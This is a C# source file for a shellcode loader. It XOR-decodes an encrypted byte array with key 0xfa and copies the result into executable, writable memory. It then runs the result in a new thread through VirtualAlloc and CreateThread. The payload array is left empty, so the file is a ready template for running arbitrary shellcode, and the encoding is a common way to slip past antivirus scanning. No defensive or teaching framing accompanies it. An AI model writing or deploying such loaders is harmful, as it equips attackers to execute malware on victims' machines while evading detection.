using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Text;

namespace XOR
{
    class Program
    {
        // Import necessary WinAPI functions
        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll")]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        // Constants for memory allocation and protection
        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;


        static string ConvertBytesToHexArray(byte[] bytes)
        {
            StringBuilder hex = new StringBuilder();
            hex.Append("{");
            for (int i = 0; i < bytes.Length; i++)
            {
                if (i % 12 == 0 && i != 0)
                    hex.Append("\n ");

                hex.AppendFormat("0x{0:X2}", bytes[i]);
                if (i < bytes.Length - 1)
                    hex.Append(",");
            }
            hex.Append("}");
            return hex.ToString();

        }

            static void Main(string[] args)
        {

            byte[] encBytes = new byte[460] {};

            // XORing decrypting
            byte[] decBytes = new byte[encBytes.Length];
            for (int i = 0; i < decBytes.Length; i++)
            {
                decBytes[i] = (byte)((uint)encBytes[i] ^0xfa);
            }

            // Allocate memory for shellcode
            IntPtr address = VirtualAlloc(IntPtr.Zero, (uint)decBytes.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(decBytes, 0, address, decBytes.Length);

            // Create thread to execute shellcode
            uint threadId;
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, address, IntPtr.Zero, 0, out threadId);

            // Wait for thread to finish execution
            WaitForSingleObject(hThread, 0xFFFFFFFF);

            // Free allocated memory
            VirtualFree(address, 0, 0x8000);
        }
    }
}
